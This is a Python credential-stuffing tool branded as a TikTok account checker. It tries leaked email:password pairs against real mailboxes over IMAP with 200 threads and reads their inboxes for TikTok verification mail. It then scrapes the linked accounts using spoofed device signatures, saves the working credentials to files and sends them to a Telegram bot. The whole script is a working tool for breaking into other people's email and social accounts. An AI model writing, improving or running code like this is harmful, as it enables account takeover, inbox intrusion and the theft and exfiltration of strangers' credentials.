#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import re
import time
import uuid
import random
import string
import secrets
import binascii
import imaplib
import email
import hashlib
import json
import threading
import concurrent.futures
from datetime import datetime
from colorama import init, Fore, Style
from fake_useragent import UserAgent
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# Initialize colorama
init(autoreset=True)

# Global counters
hits = 0
bad = 0
banned = 0
total_likes = 0
send_to_telegram = True
telegram_token = ""
telegram_chat_id = ""
hit_accounts = []  # Store hit accounts

class Ladon:
    @staticmethod
    def encrypt(unix, license_id, aid):
        return hashlib.md5(f"{unix}{license_id}{aid}".encode()).hexdigest()

class Gorgon:
    def __init__(self, params, unix, payload, cookie):
        self.params = params
        self.unix = unix
        self.payload = payload
        self.cookie = cookie
    
    def get_value(self):
        return {
            "x-gorgon": hashlib.md5(f"{self.unix}{self.params}{self.payload or ''}".encode()).hexdigest(),
            "x-khronos": str(self.unix)
        }

class Argus:
    @staticmethod
    def get_sign(params, x_ss_stub, unix, platform, aid, license_id, sec_device_id, sdk_version, sdk_version_int):
        data = f"{params}{x_ss_stub or ''}{unix}{platform}{aid}{license_id}{sec_device_id}{sdk_version}{sdk_version_int}"
        return hashlib.sha256(data.encode()).hexdigest()

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    border = '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'
    
    logo = f"""{Fore.YELLOW}
 ████████╗██╗██╗  ██╗████████╗ ██████╗ ██╗  ██╗
 ╚══██╔══╝██║██║ ██╔╝╚══██╔══╝██╔═══██╗██║ ██╔╝
    ██║   ██║█████╔╝    ██║   ██║   ██║█████╔╝ 
    ██║   ██║██╔═██╗    ██║   ██║   ██║██╔═██╗ 
    ██║   ██║██║  ██╗   ██║   ╚██████╔╝██║  ██╗
    ╚═╝   ╚═╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝
    {Fore.CYAN}         Account Checker v2.0
    """
    
    print('\033[1m' + border)
    print(logo)
    print('\033[1m' + border + Style.RESET_ALL)
    print('\n' * 1)

def print_stats():
    print(f"\r{Fore.GREEN}Hits: {hits} {Fore.RED}| Bad: {bad} {Fore.YELLOW}| Banned: {banned} | Total Likes: {total_likes}", end="")

def save_hits_to_file(email_addr, password, username, account_data, level):
    """Save hit accounts to a file"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Save to hits.txt
    with open("hits.txt", "a", encoding="utf-8") as f:
        f.write(f"[{timestamp}]\n")
        f.write(f"Email: {email_addr}\n")
        f.write(f"Password: {password}\n")
        f.write(f"Username: @{username}\n")
        f.write(f"Name: {account_data['name']}\n")
        f.write(f"Followers: {account_data['folos']}\n")
        f.write(f"Following: {account_data['folon']}\n")
        f.write(f"Likes: {account_data['lik']}\n")
        f.write(f"ID: {account_data['id']}\n")
        f.write(f"Private: {account_data['priv']}\n")
        f.write(f"Videos: {account_data['vid']}\n")
        f.write(f"Verified: {account_data['verified']}\n")
        f.write(f"Level: {level}\n")
        f.write("-" * 50 + "\n\n")
    
    # Save to combo format (email:pass:username)
    with open("combo_hits.txt", "a", encoding="utf-8") as f:
        f.write(f"{email_addr}:{password}:{username}\n")

def get_user_id(username):
    headers = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Android 10; Pixel 3 Build/QKQ1.200308.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/125.0.6394.70 Mobile Safari/537.36 trill_350402 JsSdk/1.0 NetType/MOBILE Channel/googleplay AppName/trill app_version/35.3.1 ByteLocale/en ByteFullLocale/en Region/IN AppId/1180 Spark/1.5.9.1 AppVersion/35.3.1 BytedanceWebview/d8a21c6",
    }
    try:
        response = requests.get(f'https://www.tiktok.com/@{username}', headers=headers, timeout=10)
        if '"webapp.user-detail"' in response.text:
            info = str(response.text.split('webapp.user-detail"')[1]).split('"RecommenUserList"')[0]
            user_id = str(info.split('id":"')[1]).split('",')[0]
            return user_id
        else:
            # Try alternative method
            match = re.search(r'"id":"(\d+)"', response.text)
            if match:
                return match.group(1)
    except Exception as e:
        print(f"{Fore.RED}[-] Error getting user ID: {str(e)}")
    
    return None

def sign(params, payload: str = None, sec_device_id: str = "", cookie: str or None = None, aid: int = 1233, license_id: int = 1611921764, sdk_version_str: str = "2.3.1.i18n", sdk_version: int = 2, platform: int = 19, unix: int = None):
    x_ss_stub = hashlib.md5(payload.encode('utf-8')).hexdigest() if payload != None else None
    if not unix: unix = int(time.time())
    return Gorgon(params, unix, payload, cookie).get_value() | {
        "x-ladon": Ladon.encrypt(unix, license_id, aid),
        "x-argus": Argus.get_sign(params, x_ss_stub, unix, platform=platform, aid=aid, license_id=license_id, sec_device_id=sec_device_id, sdk_version=sdk_version_str, sdk_version_int=sdk_version)
    }

def get_level(username):
    """Get real level count from TikTok API"""
    try:
        user_id = get_user_id(username)
        if not user_id:
            return "N/A"
        
        # Generate random device IDs
        iid = random.randint(1000000000000000000, 9999999999999999999)
        device_id = random.randint(1000000000000000000, 9999999999999999999)
        openudid = binascii.hexlify(os.urandom(8)).decode()
        cdid = str(uuid.uuid4())
        
        # Construct URL with proper parameters
        params = {
            "request_from": "profile_card_v2",
            "request_from_scene": "1",
            "target_uid": user_id,
            "iid": iid,
            "device_id": device_id,
            "ac": "wifi",
            "channel": "googleplay",
            "aid": "1233",
            "app_name": "musical_ly",
            "version_code": "300102",
            "version_name": "30.1.2",
            "device_platform": "android",
            "os": "android",
            "ab_version": "30.1.2",
            "ssmix": "a",
            "device_type": "RMX3511",
            "device_brand": "realme",
            "language": "ar",
            "os_api": "33",
            "os_version": "13",
            "openudid": openudid,
            "manifest_version_code": "2023001020",
            "resolution": "1080*2236",
            "dpi": "360",
            "update_version_code": "2023001020",
            "_rticket": str(int(time.time() * 1000)),
            "current_region": "IQ",
            "app_type": "normal",
            "sys_region": "IQ",
            "mcc_mnc": "41805",
            "timezone_name": "Asia/Baghdad",
            "carrier_region_v2": "418",
            "residence": "IQ",
            "app_language": "ar",
            "carrier_region": "IQ",
            "ac2": "wifi",
            "uoo": "0",
            "op_region": "IQ",
            "timezone_offset": "10800",
            "build_number": "30.1.2",
            "host_abi": "arm64-v8a",
            "locale": "ar",
            "region": "IQ",
            "ts": str(int(time.time())),
            "cdid": cdid,
            "webcast_sdk_version": "2920",
            "webcast_language": "ar",
            "webcast_locale": "ar_IQ"
        }
        
        # Build URL
        base_url = "https://webcast16-normal-no1a.tiktokv.eu/webcast/user/?"
        query_string = "&".join([f"{k}={v}" for k, v in params.items()])
        url = base_url + query_string
        
        # Headers
        headers = {
            'User-Agent': 'com.zhiliaoapp.musically/2023001020 (Linux; U; Android 13; ar; RMX3511; Build/TP1A.220624.014; Cronet/TTNetVersion:06d6a583 2023-04-17 QuicVersion:d298137e 2023-02-13)',
            'Accept': 'application/json',
            'Accept-Language': 'ar-IQ',
            'Connection': 'keep-alive',
        }
        
        # Generate signatures
        sec_device_id = "AadCFwpTyztA5j9L" + ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(9))
        signatures = sign(query_string, '', sec_device_id, None, 1233)
        headers.update(signatures)
        
        # Make request
        session = requests.Session()
        retry = Retry(total=2, backoff_factor=0.5)
        adapter = HTTPAdapter(max_retries=retry)
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        
        response = session.get(url, headers=headers, timeout=15)
        
        if response.status_code == 200:
            # Try multiple patterns for level extraction
            response_text = response.text
            
            # Pattern 1: Direct level field
            level_match = re.search(r'"level":\s*(\d+)', response_text)
            if level_match:
                return level_match.group(1)
            
            # Pattern 2: user_attr object
            user_attr_match = re.search(r'"user_attr":\s*{[^}]+"level":\s*(\d+)', response_text)
            if user_attr_match:
                return user_attr_match.group(1)
            
            # Pattern 3: default_pattern with Arabic text
            pattern_match = re.search(r'"default_pattern":\s*"([^"]+)"', response_text)
            if pattern_match:
                pattern_text = pattern_match.group(1)
                # Extract number from pattern
                num_match = re.search(r'(\d+)', pattern_text)
                if num_match:
                    return num_match.group(1)
                return pattern_text
            
            # Pattern 4: user_level_info
            level_info_match = re.search(r'"user_level_info":\s*{[^}]+"level":\s*(\d+)', response_text)
            if level_info_match:
                return level_info_match.group(1)
            
            # Pattern 5: Try to parse JSON and search recursively
            try:
                data = json.loads(response_text)
                
                def find_level(obj):
                    if isinstance(obj, dict):
                        if 'level' in obj and isinstance(obj['level'], (int, str)):
                            return str(obj['level'])
                        for value in obj.values():
                            result = find_level(value)
                            if result and result != "N/A":
                                return result
                    elif isinstance(obj, list):
                        for item in obj:
                            result = find_level(item)
                            if result and result != "N/A":
                                return result
                    return "N/A"
                
                level_result = find_level(data)
                if level_result != "N/A":
                    return level_result
                    
            except json.JSONDecodeError:
                pass
        
        return "N/A"
        
    except Exception as e:
        return "N/A"

def get_imap_server(email_addr):
    domain = email_addr.split('@')[-1].lower()
    
    # Common email providers
    imap_servers = {
        'gmail.com': 'imap.gmail.com',
        'googlemail.com': 'imap.gmail.com',
        'outlook.com': 'imap-mail.outlook.com',
        'hotmail.com': 'imap-mail.outlook.com',
        'live.com': 'imap-mail.outlook.com',
        'yahoo.com': 'imap.mail.yahoo.com',
        'ymail.com': 'imap.mail.yahoo.com',
        'aol.com': 'imap.aol.com',
        'icloud.com': 'imap.mail.me.com',
        'mail.com': 'imap.mail.com',
        'yandex.com': 'imap.yandex.com',
        'protonmail.com': 'imap.protonmail.ch',
        'proton.me': 'imap.protonmail.ch',
        't-online.de': 'imap.t-online.de'
    }
    
    if domain in imap_servers:
        return imap_servers[domain]
    else:
        return f"imap.{domain}"

def send_telegram_message(token, chat_id, message):
    try:
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        data = {
            "chat_id": chat_id,
            "text": message,
            "parse_mode": "HTML",
            "disable_web_page_preview": True
        }
        response = requests.post(url, data=data, timeout=15)
        if response.status_code == 200:
            return True
        else:
            print(f"{Fore.RED}[-] Telegram API Error: {response.status_code}")
            return False
    except Exception as e:
        print(f"{Fore.RED}[-] Telegram send error: {str(e)}")
        return False

def capture(email_addr, password, username):
    global hits, banned, total_likes, telegram_token, telegram_chat_id, hit_accounts
    
    try:
        ua = UserAgent()
        headers = {
            'user-agent': ua.random,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        }
        
        session = requests.Session()
        retry = Retry(total=3, backoff_factor=0.5, status_forcelist=[500, 502, 503, 504])
        adapter = HTTPAdapter(max_retries=retry, pool_connections=100, pool_maxsize=100)
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        
        response = session.get(f'https://www.tiktok.com/@{username}', headers=headers, timeout=15)
        
        # Extract account information
        account_data = {
            'user': username,
            'name': 'N/A',
            'folos': '0',
            'folon': '0',
            'lik': '0',
            'id': 'N/A',
            'priv': 'No',
            'vid': '0',
            'verified': 'No'
        }
        
        # Extract profile information
        page_content = response.text
        
        # Extract name
        name_match = re.search(r'"nickname":"([^"]+)"', page_content)
        if name_match:
            account_data['name'] = name_match.group(1).replace('\\', '')
        
        # Extract user ID
        id_match = re.search(r'"id":"([^"]+)"', page_content)
        if id_match:
            account_data['id'] = id_match.group(1)
        
        # Extract followers
        folos_match = re.search(r'"followerCount":(\d+)', page_content)
        if folos_match:
            account_data['folos'] = folos_match.group(1)
        
        # Extract following
        folon_match = re.search(r'"followingCount":(\d+)', page_content)
        if folon_match:
            account_data['folon'] = folon_match.group(1)
        
        # Extract likes
        lik_match = re.search(r'"heartCount":(\d+)', page_content)
        if lik_match:
            account_data['lik'] = lik_match.group(1)
            total_likes += int(account_data['lik'])
        
        # Extract private status
        if '"privateAccount":true' in page_content:
            account_data['priv'] = 'Yes'
        
        # Extract video count
        vid_match = re.search(r'"videoCount":(\d+)', page_content)
        if vid_match:
            account_data['vid'] = vid_match.group(1)
        
        # Extract verified status
        if '"verified":true' in page_content:
            account_data['verified'] = 'Yes'
        
        # Get level (REAL COUNT)
        level = get_level(username)
        
        # Update hits counter
        hits += 1
        
        # Add to hit accounts list
        hit_info = {
            'email': email_addr,
            'password': password,
            'username': username,
            'data': account_data,
            'level': level,
            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        hit_accounts.append(hit_info)
        
        # Save to file
        save_hits_to_file(email_addr, password, username, account_data, level)
        
        # Print hit information
        print(f"\n{Fore.GREEN}[+] HIT #{hits} FOUND!")
        print(f"{Fore.CYAN}├─ Email: {email_addr}")
        print(f"{Fore.CYAN}├─ Password: {password}")
        print(f"{Fore.CYAN}├─ Username: @{username}")
        print(f"{Fore.CYAN}├─ Name: {account_data['name']}")
        print(f"{Fore.CYAN}├─ Followers: {account_data['folos']}")
        print(f"{Fore.CYAN}├─ Following: {account_data['folon']}")
        print(f"{Fore.CYAN}├─ Likes: {account_data['lik']}")
        print(f"{Fore.CYAN}└─ Level: {level}")
        
        # Send to Telegram (with proper message)
        if send_to_telegram and telegram_token and telegram_chat_id:
            # Format the message exactly as requested
            message = f"""<b>[ • ] Number of catches = {hits}</b>
[ • ] username : @{account_data['user']}
[ • ] email : {email_addr}
[ • ] password : {password}
[ • ] name : {account_data['name']}
[ • ] followers : {account_data['folos']}
[ • ] following : {account_data['folon']}
[ • ] likes : {account_data['lik']}
[ • ] id : {account_data['id']}
[ • ] private : {account_data['priv']}
[ • ] videos : {account_data['vid']}
[ • ] verified : {account_data['verified']}
[ • ] Level : {level}
[ • ] By - @kurdpy"""
            
            # Send message
            if send_telegram_message(telegram_token, telegram_chat_id, message):
                print(f"{Fore.GREEN}[+] Telegram notification sent!")
            else:
                print(f"{Fore.YELLOW}[-] Failed to send Telegram notification")
        
        print_stats()
        return True
        
    except Exception as e:
        print(f"\n{Fore.RED}[-] Error capturing {username}: {str(e)}")
        return False

def check_email(email_addr, password):
    global bad, banned
    
    try:
        imap_server = get_imap_server(email_addr)
        
        # Try to connect to IMAP server
        try:
            mail = imaplib.IMAP4_SSL(imap_server, timeout=20)
            mail.login(email_addr, password)
            mail.select("inbox")
            
            # Search for TikTok verification emails
            result, data = mail.search(None, '(FROM "register@account.tiktok.com" SUBJECT "verification")')
            
            if result == "OK" and data[0]:
                email_ids = data[0].split()
                
                # Check recent emails
                for num in email_ids[-5:]:
                    result, msg_data = mail.fetch(num, "(RFC822)")
                    
                    if result == "OK":
                        for response_part in msg_data:
                            if isinstance(response_part, tuple):
                                msg = email.message_from_bytes(response_part[1])
                                subject = str(msg.get("Subject", "")).lower()
                                from_addr = str(msg.get("From", "")).lower()
                                
                                if "register@account.tiktok.com" in from_addr and "verification" in subject:
                                    # Get email body
                                    body = ""
                                    if msg.is_multipart():
                                        for part in msg.walk():
                                            content_type = part.get_content_type()
                                            content_disposition = str(part.get("Content-Disposition", ""))
                                            
                                            if content_type == "text/plain" and "attachment" not in content_disposition:
                                                try:
                                                    body = part.get_payload(decode=True).decode('utf-8', errors='ignore')
                                                    break
                                                except:
                                                    continue
                                    else:
                                        try:
                                            body = msg.get_payload(decode=True).decode('utf-8', errors='ignore')
                                        except:
                                            body = msg.get_payload()
                                    
                                    # Extract username from body
                                    if body:
                                        # Try multiple patterns
                                        patterns = [
                                            r'Hi\s+([a-zA-Z0-9_.-]+),',
                                            r'Hello\s+([a-zA-Z0-9_.-]+),',
                                            r'username[:\s]+([a-zA-Z0-9_.-]+)',
                                            r'@([a-zA-Z0-9_.-]+)\s',
                                            r'for\s+([a-zA-Z0-9_.-]+)\s',
                                            r'account\s+([a-zA-Z0-9_.-]+)\s'
                                        ]
                                        
                                        for pattern in patterns:
                                            match = re.search(pattern, body, re.IGNORECASE)
                                            if match:
                                                username = match.group(1)
                                                # Clean username
                                                username = re.sub(r'[^\w_.-]', '', username)
                                                if 3 <= len(username) <= 30 and re.match(r'^[a-zA-Z0-9_.-]+$', username):
                                                    mail.logout()
                                                    return username
        
        except imaplib.IMAP4.error as e:
            error_msg = str(e).lower()
            if "authentication failed" in error_msg or "invalid credentials" in error_msg:
                bad += 1
                print_stats()
            elif "banned" in error_msg or "blocked" in error_msg or "too many" in error_msg:
                banned += 1
                print_stats()
            return None
        except Exception as e:
            return None
        
        mail.logout()
        return None
        
    except Exception as e:
        return None

def process_account(line):
    global hits, bad, banned, telegram_token, telegram_chat_id
    
    try:
        if ':' not in line:
            return
        
        email_addr, password = line.strip().split(':', 1)
        
        # Check email for TikTok verification
        username = check_email(email_addr, password)
        
        if username:
            capture(email_addr, password, username)
        else:
            bad += 1
            print_stats()
            
    except Exception as e:
        bad += 1
        print_stats()

def main():
    global telegram_token, telegram_chat_id, send_to_telegram, hits, bad, banned, total_likes
    
    clear_screen()
    print_banner()
    
    # Get Telegram credentials
    telegram_token = input(f"{Fore.YELLOW}[?] Telegram Bot Token: {Fore.WHITE}")
    telegram_chat_id = input(f"{Fore.YELLOW}[?] Chat ID: {Fore.WHITE}")
    
    # Verify Telegram token
    if telegram_token and telegram_chat_id:
        print(f"{Fore.CYAN}[*] Testing Telegram connection...")
        if send_telegram_message(telegram_token, telegram_chat_id, "🔔 TikTok Checker Started!\nBot is ready to receive hits."):
            print(f"{Fore.GREEN}[+] Telegram connection successful!")
        else:
            print(f"{Fore.YELLOW}[-] Telegram connection failed, continuing without notifications...")
            send_to_telegram = False
    
    # Get combo file
    print(f"\n{Fore.CYAN}[!] Enter combo file path (email:pass format)")
    combo_file = input(f"{Fore.YELLOW}[?] File: {Fore.WHITE}")
    
    if not os.path.exists(combo_file):
        print(f"{Fore.RED}[!] File not found!")
        return
    
    # Read accounts
    with open(combo_file, 'r', encoding='utf-8', errors='ignore') as f:
        accounts = [line.strip() for line in f if ':' in line]
    
    if not accounts:
        print(f"{Fore.RED}[!] No valid accounts found in file!")
        return
    
    print(f"{Fore.GREEN}[+] Loaded {len(accounts)} accounts")
    print(f"{Fore.CYAN}[*] Starting check with 200 workers...")
    print(f"{Fore.CYAN}[*] Hits will be saved to 'hits.txt' and 'combo_hits.txt'")
    
    # Clear screen and show stats
    time.sleep(2)
    clear_screen()
    print_banner()
    print_stats()
    print(f"\n{Fore.CYAN}[!] Checking in progress... Press Ctrl+C to stop\n")
    
    # Process accounts with thread pool
    max_workers = 200
    
    try:
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = []
            for account in accounts:
                future = executor.submit(process_account, account)
                futures.append(future)
            
            # Wait for all tasks to complete
            for future in concurrent.futures.as_completed(futures):
                try:
                    future.result()
                except Exception:
                    pass
    
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}[!] Process interrupted by user")
    
    # Final summary
    print(f"\n\n{Fore.GREEN}{'='*60}")
    print(f"{Fore.GREEN}[+] CHECK COMPLETED!")
    print(f"{Fore.GREEN}{'='*60}")
    print(f"{Fore.CYAN}[+] Total Accounts: {len(accounts)}")
    print(f"{Fore.GREEN}[+] Hits: {hits}")
    print(f"{Fore.RED}[+] Bad: {bad}")
    print(f"{Fore.YELLOW}[+] Banned: {banned}")
    print(f"{Fore.CYAN}[+] Total Likes: {total_likes}")
    print(f"{Fore.GREEN}{'='*60}")
    
    # Save final hits summary
    if hits > 0:
        with open("summary.txt", "w", encoding="utf-8") as f:
            f.write(f"TikTok Checker Summary\n")
            f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Total Accounts: {len(accounts)}\n")
            f.write(f"Hits: {hits}\n")
            f.write(f"Bad: {bad}\n")
            f.write(f"Banned: {banned}\n")
            f.write(f"Total Likes: {total_likes}\n\n")
            f.write("Hit Accounts:\n")
            for i, hit in enumerate(hit_accounts, 1):
                f.write(f"{i}. @{hit['username']} | {hit['email']} | Level: {hit['level']}\n")
        
        print(f"{Fore.GREEN}[+] Summary saved to 'summary.txt'")
        
        # Send final summary to Telegram
        if send_to_telegram and telegram_token and telegram_chat_id:
            summary_msg = f"""<b>✅ CHECK COMPLETED!</b>
📊 <b>Summary:</b>
├─ Total Accounts: {len(accounts)}
├─ Hits: {hits}
├─ Bad: {bad}
├─ Banned: {banned}
└─ Total Likes: {total_likes}

🔥 <b>Hit Accounts Found:</b> {hits}
📁 Check 'hits.txt' for details!
🎯 By - @kurdpy"""
            send_telegram_message(telegram_token, telegram_chat_id, summary_msg)
    
    print(f"\n{Fore.GREEN}[+] Results saved in:")
    print(f"{Fore.CYAN}   - hits.txt (detailed hits)")
    print(f"{Fore.CYAN}   - combo_hits.txt (email:pass:username format)")
    if hits > 0:
        print(f"{Fore.CYAN}   - summary.txt (check summary)")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.RED}[!] Process interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}[!] Critical Error: {str(e)}")
        import traceback
        traceback.print_exc()
        sys.exit(1)